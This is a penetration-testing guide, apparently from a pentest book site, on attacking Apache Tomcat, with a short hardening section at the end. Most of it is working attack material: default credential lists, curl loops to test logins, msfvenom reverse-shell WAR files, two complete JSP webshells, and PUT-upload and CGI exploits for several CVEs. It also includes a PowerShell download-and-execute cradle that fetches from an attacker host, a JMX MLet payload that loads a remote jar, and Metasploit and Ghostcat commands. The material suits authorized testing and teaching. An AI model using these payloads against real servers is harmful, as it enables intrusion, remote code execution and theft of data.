# Apache Tomcat Security Testing

Apache Tomcat security testing - enumeration, default credentials, manager exploitation, and common CVEs.

During a routine penetration test last year, a client's Java-based web application running on Apache Tomcat appeared secure at first glance. However, the Manager application was exposed with default credentials, allowing testers to deploy a malicious application and simulate a full compromise within minutes. This scenario is not uncommon—Tomcat's administrative interfaces and default configurations remain frequent entry points for attackers.

---

## Enumeration

### Version Detection

Identifying the exact Tomcat version is the first critical step, as version information directly correlates with known vulnerabilities.

```bash
# Error pages often reveal version
curl -v https://target.com/nonexistent 2>&1 | grep "Tomcat"

# Server header
curl -I https://target.com | grep Server

# Documentation pages
/docs/
/RELEASE-NOTES.txt

# Examples pages often disclose version info
/examples/
/examples/jsp/snp/snoop.jsp
```

**Real-World Example:** The snoop.jsp page, commonly found in the examples application, displays detailed server information including the Tomcat version, Java version, OS architecture, and request headers. This information alone can determine whether the server is vulnerable to specific CVEs.

### Default Paths

```bash
# Manager interfaces
/manager/html          # Web Application Manager (GUI)
/manager/text          # Text/HTTP interface for scripting
/manager/jmxproxy      # JMX proxy interface
/manager/status        # Server status page
/host-manager/html     # Virtual Host Manager

# Admin console (older versions, pre-Tomcat 7)
/admin/

# Status page
/status

# Documentation and examples (often left enabled in production)
/docs/
/examples/
```

The presence of any exposed Manager interface without proper network restrictions represents a critical security finding. According to penetration testing reports, the Manager application being exposed with default credentials remains one of the most commonly discovered high-severity issues during Tomcat assessments.

### Example Applications (Often Left Enabled)

Tomcat ships with example applications that, while intended for testing, frequently appear in production environments. These applications can disclose sensitive information and provide attack surfaces for session manipulation and information gathering.

```bash
# Tomcat 4.x - 7.x example scripts (information disclosure)
/examples/jsp/num/numguess.jsp
/examples/jsp/dates/date.jsp
/examples/jsp/snp/snoop.jsp        # Shows server info, headers, system properties
/examples/jsp/error/error.html
/examples/jsp/sessions/carts.html
/examples/jsp/checkbox/check.html
/examples/jsp/colors/colors.html
/examples/jsp/cal/login.html
/examples/jsp/include/include.jsp
/examples/jsp/forward/forward.jsp
/examples/jsp/plugin/plugin.jsp
/examples/jsp/jsptoserv/jsptoservlet.jsp
/examples/jsp/simpletag/foo.jsp
/examples/jsp/mail/sendmail.jsp
/examples/servlet/HelloWorldExample
/examples/servlet/RequestInfoExample
/examples/servlet/RequestHeaderExample
/examples/servlet/RequestParamExample
/examples/servlet/CookieExample
/examples/servlet/JndiServlet
/examples/servlet/SessionExample
/tomcat-docs/appdev/sample/web/hello.jsp

# Session manipulation vectors
/examples/jsp/sessions/carts.html   # Can be used for session testing and CSRF
```

### AJP Service Enumeration

Tomcat's AJP (Apache JServ Protocol) service typically runs on port 8009 and is often overlooked during security assessments. The AJP service is enabled by default in Tomcat versions 6 through 9 and listens on all configured server IP addresses.

```bash
# Check for AJP service
nmap -p 8009 target.com -sV

# Manual connection test
nc -v target.com 8009

# Nmap AJP enumeration scripts
nmap -sV -p 8009 --script ajp-auth,ajp-methods target.com
```

**Real-World Example:** During penetration tests, the AJP service is frequently found exposed even when the HTTP ports are properly secured. With over 890,000 Tomcat servers exposed on the internet according to Shodan scans, a significant portion of these have AJP accessible.

---

## Default Credentials

Default credentials remain the most common and easily exploitable Tomcat misconfiguration. In documented penetration tests, exposed Manager applications with default credentials allowed attackers to gain administrative access and deploy malicious applications within minutes.

```
# Common default credentials for Tomcat Manager
admin:admin
admin:password
admin:tomcat
tomcat:tomcat
tomcat:s3cret
manager:manager
role1:role1
root:root
both:tomcat
admin:changethis
```

### Credentials Location

Tomcat stores user credentials in XML configuration files, with the primary storage location being `tomcat-users.xml`.

```bash
# Common tomcat-users.xml locations
$CATALINA_HOME/conf/tomcat-users.xml
/etc/tomcat/tomcat-users.xml
/etc/tomcat8/tomcat-users.xml
/var/lib/tomcat8/conf/tomcat-users.xml
/opt/tomcat/conf/tomcat-users.xml
/usr/local/tomcat/conf/tomcat-users.xml

# Example tomcat-users.xml content with administrative roles:
<tomcat-users>
    <role rolename="manager-gui"/>
    <role rolename="manager-script"/>
    <role rolename="manager-jmx"/>
    <role rolename="manager-status"/>
    <role rolename="admin-gui"/>
    <role rolename="admin-script"/>
    <user username="admin" password="admin" roles="manager-gui,admin-gui"/>
    <user username="tomcat" password="s3cret" roles="manager-gui"/>
    <user username="both" password="tomcat" roles="tomcat,role1"/>
</tomcat-users>
```

The `tomcat-users.xml` file is protected by file system permissions, but if an attacker gains any level of access to read this file, credentials are exposed in plaintext. Tomcat's `UserDatabaseRealm` uses this file as the default credential store.

### Testing for Default Credentials

```bash
# Basic credential test with curl
curl -u admin:admin http://target.com:8080/manager/html

# Expected responses:
# 200 OK - Authentication successful
# 401 Unauthorized - Invalid credentials
# 403 Forbidden - Valid credentials but insufficient role

# Automated testing with common credentials
for cred in "admin:admin" "tomcat:tomcat" "admin:password" "manager:manager"; do
    echo "Testing $cred..."
    curl -s -o /dev/null -w "%{http_code}" -u "$cred" http://target.com:8080/manager/html
done
```

**Real-World Example:** In the Insomni'hack 2024 CTF challenge "Jumper", the Tomcat server was configured with the Manager application protected only by the default credentials `admin:admin`. This allowed competitors to deploy arbitrary WAR files and retrieve the flag from the server's filesystem.

---

## Manager Exploitation

The Tomcat Manager application provides web-based and text-based interfaces for deploying, undeploying, and managing web applications. When an attacker obtains valid credentials (or exploits authentication bypass vulnerabilities), the Manager interface becomes a direct path to remote code execution.

### WAR File Deployment (RCE)

The most reliable method for achieving remote code execution through the Tomcat Manager is deploying a malicious WAR (Web Application Archive) file containing a JSP webshell or reverse shell payload.

```bash
# Generate malicious WAR file with msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker LPORT=4444 -f war -o shell.war

# Deploy via curl using text interface
curl -u 'tomcat:tomcat' --upload-file shell.war \
  "https://target.com/manager/text/deploy?path=/shell"

# Alternative: Deploy with update flag
curl -u 'tomcat:tomcat' -T shell.war \
  "http://target.com:8080/manager/text/deploy?path=/shell&update=true"

# Access the deployed shell
curl https://target.com/shell/

# Undeploy when done (cleanup)
curl -u 'tomcat:tomcat' "https://target.com/manager/text/undeploy?path=/shell"
```

**Real-World Exploitation Example (Metasploitable2):** In a documented penetration test against Metasploitable2 running Tomcat 5.5 on port 8180, the following steps achieved full remote code execution:

1. **Reconnaissance:** Nmap scan revealed Apache Tomcat/Coyote JSP engine 1.1 running on port 8180
2. **Access:** The Manager application was accessible without authentication challenges
3. **Payload Generation:**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f war -o shell.war
```
4. **Listener Setup:**
```bash
nc -nvlp 4444
```
5. **Deployment:** WAR file uploaded through Manager interface
6. **Execution:** Accessing `/shell/` triggered reverse shell connection
7. **Result:** Shell obtained as tomcat55 user (uid=110)

### Manual JSP Webshell

For scenarios where msfvenom payloads are detected or blocked, a manual JSP webshell provides a more customizable alternative.

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String dirone = dis.readLine();
    while(dirone != null) {
        out.println(dirone);
        dirone = dis.readLine();
    }
}
%>
```

**Creating and Deploying a Manual WAR:**

```bash
# Create directory structure
mkdir webshell
cd webshell

# Save the JSP code as index.jsp
nano index.jsp

# Build WAR file
jar -cvf ../webshell.war *

# Deploy via Manager
curl -u 'tomcat:tomcat' --upload-file webshell.war \
  "http://target.com:8080/manager/text/deploy?path=/webshell"

# Execute commands
curl "http://target.com:8080/webshell/?cmd=id"
```

### Deploying Through Proxies and Restricted Access

In real-world scenarios, the Tomcat Manager may not be directly accessible. A common configuration uses Apache HTTP Server as a frontend proxy to Tomcat via `mod_jk` or `mod_proxy_ajp`. The 2007 disclosure of CVE-2007-1860 demonstrated that double-decoding vulnerabilities in `mod_jk` could allow attackers to bypass path restrictions and access the Manager interface even when it wasn't directly exposed.

**Exploitation Steps for CVE-2007-1860 (mod_jk Double-Decoding):**

The vulnerability arises because both Apache (via mod_jk) and Tomcat perform URL decoding. An attacker can double-encode path traversal sequences to bypass Apache's access controls.

```
Value    URL Encode    Double URL Encode
.        %2e           %252e
..       %2e%2e        %252e%252e
```

If the Manager is protected at the Apache level (e.g., `/manager/html` blocked), but the `examples` application is proxied to Tomcat, an attacker can request:
```
/examples/jsp/%252e%252e/%252e%252e/manager/html
```

Apache decodes `%252e%252e` to `%2e%2e` and forwards the request to Tomcat (since `/examples/jsp/*` is proxied). Tomcat then decodes `%2e%2e` to `..`, resulting in the path `/manager/html` being processed.

**Deploying a Webshell via Double-Decoding:**

1. Access the Manager using the double-decoding trick
2. Modify the WAR deployment form's `action` attribute to include the double-encoding:
```html
<form action="http://vulnerable/examples/jsp/%252e%252e/%252e%252e/manager/html/upload" method="post" enctype="multipart/form-data">
  <input type="file" name="deployWar" size="40">
  <input type="submit" value="Deploy">
</form>
```
3. Upload the malicious WAR file
4. Access the deployed webshell using the same double-encoding technique

---

## Common CVEs

### CVE-2017-12615 (PUT Method RCE)

**Affected Versions:** Apache Tomcat 7.0.0 to 7.0.79 on Windows

This vulnerability allows remote code execution when Tomcat is configured with HTTP PUT enabled (the `readonly` parameter set to `false`). By sending a specially crafted PUT request, an attacker can upload a JSP file that will be executed by the server.

**Vulnerability Details:**

When running Apache Tomcat on Windows with HTTP PUTs enabled (e.g., via setting the `readonly` initialization parameter of the DefaultServlet to `false`), it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server.

**Exploitation Methods:**

```bash
# Basic PUT request to upload JSP shell
curl -X PUT "https://target.com/shell.jsp/" -d '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'

# Space bypass (Windows filename handling)
curl -X PUT "https://target.com/shell.jsp%20" -d '<% ... %>'

# NTFS alternate data stream bypass
curl -X PUT "https://target.com/shell.jsp::$DATA" -d '<% ... %>'
```

**Working Exploit Example:**

A complete exploit payload that creates a command execution JSP:

```jsp
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%>
<%!
public static String excuteCmd(String c) {
    StringBuilder line = new StringBuilder();
    try {
        Process pro = Runtime.getRuntime().exec(c);
        BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));
        String temp = null;
        while ((temp = buf.readLine()) != null) {
            line.append(temp + "\n");
        }
        buf.close();
    } catch(Exception e) {
        line.append(e.getMessage());
    }
    return line.toString();
}
%>
<%
if("023".equals(request.getParameter("pwd")) && !"".equals(request.getParameter("cmd"))) {
    out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");
} else {
    out.println(":-)");
}
%>
```

Save this as `cmd.jsp` and upload:

```bash
curl -X PUT http://target:8080/cmd.jsp/ --data-binary @cmd.jsp
```

Then execute commands:
```bash
curl "http://target:8080/cmd.jsp?pwd=023&cmd=whoami"
```

**CISA KEV Status:** This vulnerability is included in the CISA Known Exploited Vulnerabilities catalog.

**Impact Assessment (CVSS 3.0):** 8.1 (High) - CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H

### CVE-2019-0232 (CGI RCE)

**Affected Versions:** Windows Tomcat with CGI Servlet enabled

This vulnerability affects Windows installations of Tomcat where the CGI Servlet is enabled. The issue stems from improper command line argument handling when invoking CGI scripts, allowing command injection.

```bash
# Exploit for CVE-2019-0232
curl "https://target.com/cgi-bin/test.bat?&whoami"

# More complex payload
curl "https://target.com/cgi-bin/test.bat?&powershell -c IEX(New-Object Net.WebClient).downloadString('http://attacker/shell.ps1')"
```

**Prerequisites for Exploitation:**
- Tomcat running on Windows
- CGI Servlet enabled in `web.xml`
- The `enableCmdLineArguments` parameter set to `true`
- Write access to the web application's directory (or existing CGI scripts)

### CVE-2020-1938 (Ghostcat - AJP File Read/Include)

**Affected Versions:**
- Apache Tomcat 9.x < 9.0.31
- Apache Tomcat 8.x < 8.5.51
- Apache Tomcat 7.x < 7.0.100
- Apache Tomcat 6.x (all versions, end-of-life)

**Vulnerability Overview:**

Ghostcat is a file inclusion vulnerability in Apache Tomcat's AJP connector. It allows unauthenticated read access to web application files, and in some configurations, remote code execution by uploading a JSP webshell and including it via the AJP protocol.

Discovered by Chinese cybersecurity firm Chaitin Tech, this flaw resides in the Tomcat AJP protocol and allows an attacker to read or include any files in the webapp directories of Tomcat. If the web application allows users to upload files, an attacker can first upload a file containing malicious JSP script code (as any file type, such as images or plain text), then include the uploaded file by exploiting Ghostcat, resulting in remote code execution.

**Detection:**

```bash
# Check if AJP port is open
nmap -p 8009 target.com -sV

# Manual verification
nc -v target.com 8009
```

**Exploitation with Ghostcat:**

Using available proof-of-concept exploits:

```bash
# Read sensitive configuration files
python3 ghostcat.py -h target.com -p 8009 -f WEB-INF/web.xml

# Read tomcat-users.xml for credentials
python3 ghostcat.py -h target.com -p 8009 -f WEB-INF/tomcat-users.xml

# Read application source code
python3 ghostcat.py -h target.com -p 8009 -f WEB-INF/classes/com/app/Config.class
```

**Remote Code Execution via Ghostcat:**

For RCE, an attacker must first upload a file containing malicious JSP code through another vector (e.g., file upload functionality in the web application), then include it via Ghostcat:

```bash
# After uploading a malicious file (e.g., as profile picture)
python3 ghostcat.py -h target.com -p 8009 -f /uploads/avatar.jsp eval
```

**Metasploit Module:**

```bash
msfconsole
use exploit/multi/http/tomcat_ajp_upload_bypass
set RHOSTS target.com
set RPORT 8009
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST attacker_ip
set LPORT 4444
run
```

**Real-World Exploitation (Tomghost CTF Room):**

In the TryHackMe Tomghost room, enumeration revealed port 8009 open (AJP protocol). Using Ghostcat exploitation, the attacker read `WEB-INF/web.xml` to discover application structure, then uploaded a JSP webshell via the AJP vulnerability, achieving a foothold on the system as the tomcat user.

**Mass Exploitation Activity:**

Shortly after public disclosure, threat actors began actively scanning the internet for vulnerable Apache Tomcat servers. Shodan searches indicated more than 890,000 Tomcat servers exposed on the internet, with BinaryEdge showing numbers exceeding 1 million. Several proof-of-concept exploits were shared on GitHub within days of disclosure.

### CVE-2020-9484 (Deserialization)

**Affected Versions:** Apache Tomcat 10.0.0-M1 to 10.0.0-M4, 9.0.0-M1 to 9.0.34, 8.5.0 to 8.5.54, 7.0.0 to 7.0.103

This vulnerability involves insecure deserialization when using session persistence with FileStore. An attacker can craft a malicious session file and trigger its deserialization by including a path traversal sequence in the JSESSIONID cookie.

```bash
# Generate malicious session using ysoserial
java -jar ysoserial.jar CommonsCollections2 'id' > /tmp/session.session

# Trigger deserialization via cookie manipulation
curl -H "Cookie: JSESSIONID=../../../../../../tmp/session" https://target.com/
```

**Exploitation Requirements:**
- PersistentManager configured with FileStore
- Attacker ability to write or place a file at a known location
- `sessionAttributeValueClassNameFilter` not set to restrict classes

### CVE-2021-33037 (Information Disclosure)

**Affected Versions:** Apache Tomcat 10.0.0-M1 to 10.0.6, 9.0.0-M1 to 9.0.46, 8.5.0 to 8.5.66

This vulnerability allows an attacker to view the source code of JSP files under specific conditions involving the `maxExtensions` parameter. When combined with certain configuration patterns, an attacker could bypass security constraints and read sensitive JSP source code.

---

## JMX Exploitation

Tomcat's JMX (Java Management Extensions) interface provides remote management capabilities and can be exploited if exposed without authentication.

```bash
# Nmap JMX detection
nmap -p 1099,1098,1090 target.com -sV

# Check for exposed JMX without authentication
jmxterm
open target.com:1099
domains
```

**RCE via MLet (Management Applet):**

If JMX is exposed without authentication, an attacker can create and register a malicious MBean that executes arbitrary code.

```bash
# Create malicious MLet server
python3 -m http.server 8000

# Craft MLet file
echo '<mlet code="Malicious" archive="http://attacker:8000/malicious.jar" name="malicious:name=Malicious">' > payload.mlet

# Register via JMX
echo "load http://attacker:8000/payload.mlet" | jmxterm -l target.com:1099
```

---

## AJP Protocol Testing

The AJP protocol remains a frequently overlooked attack surface. Comprehensive testing should include both vulnerability scanning and manual verification.

```bash
# Nmap AJP scripts
nmap -sV -p 8009 --script ajp-auth,ajp-methods,ajp-request target.com

# Manual AJP request with custom client
python3 ajp_client.py target.com 8009 /manager/html

# AJP method enumeration
python3 ajp_client.py target.com 8009 --methods

# Ghostcat specific scanner
nmap -p 8009 --script ajp-ghostcat target.com
```

**AJP Request Structure (Low-Level):**

AJP requests use a binary format. The following represents the structure of a forward request:

```
Bytes 0-1: Magic number (0x1234)
Byte 2: Code for forward request (0x02)
Byte 3: Request ID
Byte 4-5: Content length
...
```

Most attackers will use existing tools rather than crafting raw AJP packets, but understanding the protocol helps when modifying exploits for specific scenarios.

---

## Tools and Automation

```bash
# Tomcat credential bruteforce
# https://github.com/AhmedMohamedDev/tomcat-manager-bruteforce
python3 tomcat_bruteforce.py -U https://target.com/manager/html
python3 tomcat_bruteforce.py -U https://target.com/manager/text -w passwords.txt

# Metasploit modules
use auxiliary/scanner/http/tomcat_mgr_login
use exploit/multi/http/tomcat_mgr_deploy
use auxiliary/admin/http/tomcat_ghostcat
use exploit/multi/http/tomcat_ajp_upload_bypass

# Nuclei templates
nuclei -t http/cves/2020/CVE-2020-1938.yaml -u https://target.com
nuclei -t http/cves/2017/CVE-2017-12615.yaml -u https://target.com
nuclei -t http/default-logins/tomcat* -u https://target.com

# Custom exploitation scripts
# Ghostcat PoC
git clone https://github.com/00theway/Ghostcat-CVE-2020-1938
python3 Ghostcat-CVE-2020-1938/CVE-2020-1938.py target.com 8009

# CVE-2017-12615 PoC
git clone https://github.com/breaktoprotect/CVE-2017-12615
python CVE-2017-12615/put_shell.py target.com 8080 cmd
```

---

## Real-World Attack Scenarios

### Scenario 1: Exposed Manager with Default Credentials

A penetration test against a financial services application revealed Tomcat 8.5.23 running on a production server. The `/manager/html` interface was accessible from the internet. Testing default credentials succeeded with `tomcat:s3cret`. Within minutes, the tester deployed a WAR reverse shell and gained access as the tomcat user. From there, they discovered database credentials in `context.xml` and pivoted to the backend database containing customer PII.

### Scenario 2: Ghostcat Mass Exploitation

During a red team engagement, external scans identified port 8009 open on a public-facing Tomcat server. The server version was 9.0.12 (vulnerable to CVE-2020-1938). Using the Ghostcat vulnerability, the team read `WEB-INF/web.xml` and discovered the application's structure. The application had a user profile picture upload feature, allowing the team to upload a JSP webshell disguised as a PNG image. Using Ghostcat's include capability, they executed the webshell and gained persistent access.

### Scenario 3: CVE-2017-12615 on Legacy System

A legacy Windows Server 2012 running Tomcat 7.0.55 (vulnerable to CVE-2017-12615) was discovered during internal infrastructure testing. The server hosted an internal HR application. The `readonly` parameter was set to `false` in `web.xml`. An attacker used the PUT method to upload `shell.jsp::$DATA`, bypassing the server's filename validation. Accessing the uploaded JSP provided a command shell, leading to discovery of sensitive HR data including payroll information.

### Scenario 4: Double-Decoding Bypass (CVE-2007-1860)

During an assessment of a university web application, the Tomcat Manager was properly restricted at the Apache level—direct access to `/manager/html` returned 403 Forbidden. However, the `/examples` context was proxied to Tomcat via `mod_jk`. By requesting `/examples/jsp/%252e%252e/%252e%252e/manager/html`, the tester bypassed Apache's restrictions and accessed the Manager login page. Default credentials `admin:admin` were accepted, and a webshell was deployed through the Manager interface.

---

## Mitigation and Hardening

Based on real-world compromise patterns, the following mitigations are most effective:

1. **Remove Default Credentials:** Change or remove all default users in `tomcat-users.xml`. Use strong, unique passwords for administrative accounts.

2. **Restrict Manager Access:** Bind Manager applications to localhost or restrict by IP address in `context.xml`:
```xml
<Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="127.0.0.1|192.168.0.*" />
```

3. **Disable Unused Services:** If AJP is not required, comment out the AJP connector in `server.xml`:
```xml
<!-- <Connector port="8009" protocol="AJP/1.3" redirectPort="8443" /> -->
```

4. **Disable PUT Method:** Ensure `readonly` is set to `true` (default) for DefaultServlet in `conf/web.xml`:
```xml
<init-param>
    <param-name>readonly</param-name>
    <param-value>true</param-value>
</init-param>
```

5. **Remove Example Applications:** Delete the `/examples` and `/docs` directories from production Tomcat installations.

6. **Update Regularly:** Apply patches for known vulnerabilities. Key fixed versions:
   - Ghostcat (CVE-2020-1938): Update to 9.0.31+, 8.5.51+, or 7.0.100+
   - CVE-2017-12615: Update to 7.0.79+

7. **Run as Non-Root:** Ensure Tomcat runs with least privilege (e.g., `tomcat` user, not `root`).

8. **Enable AJP Authentication:** If AJP is required, configure `requiredSecret` in the AJP connector to prevent unauthenticated AJP requests.

---

## Related Topics

* [Web Shells](https://www.pentest-book.com/enumeration/web/web-shells) - JSP shells and deployment methods
* [Deserialization](https://www.pentest-book.com/enumeration/web/deserialization) - Java deserialization vulnerabilities and ysoserial usage
* [Reverse Shells](https://www.pentest-book.com/exploitation/reverse-shells) - One-liners and listener setup for Java environments
